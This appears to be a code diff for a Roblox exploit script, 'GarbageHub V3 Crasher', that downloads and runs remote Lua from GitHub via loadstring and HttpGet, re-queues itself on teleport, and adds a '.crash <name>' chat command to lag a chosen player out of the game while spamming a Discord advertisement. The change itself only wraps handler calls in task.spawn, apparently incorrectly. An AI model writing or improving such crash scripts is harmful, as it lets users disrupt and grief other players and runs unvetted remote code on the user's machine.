@@ -6,13 +6,13 @@ local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or flux
 local handler = loadstring(game:HttpGet("https://raw.githubusercontent.com/availablegithubname/GarbageHubForRoblox/main/garbage.lua"))()
 queueteleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/availablegithubname/GarbageHubForRoblox/main/GarbageHubMain.lua"))()]])
 game.StarterGui:SetCore("SendNotification",{Title = "GarbageHub V3 Crasher",Text = ".crash <name> to lag someone out."})
-handler.e()
+task.spawn(handler.e())
 game.Players.PlayerChatted:Connect(function(_,sender,msg,_)
     if sender == game.Players.LocalPlayer and string.find(string.lower(msg), ".crash") then
         shared.Garbage.Target = game.Players:FindFirstChild(msg:split(' ')[2])
         if shared.Garbage.Target then
             game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("JOIN DISSORD.GG/GBH FOR OP CRASH SCRIPTS","All")
-            handler.c()
+            task.spawn(handler.c())
         else
             game.StarterGui:SetCore("SendNotification",{Title = "Crash Failed",Text = "Player does not exist."})
         end
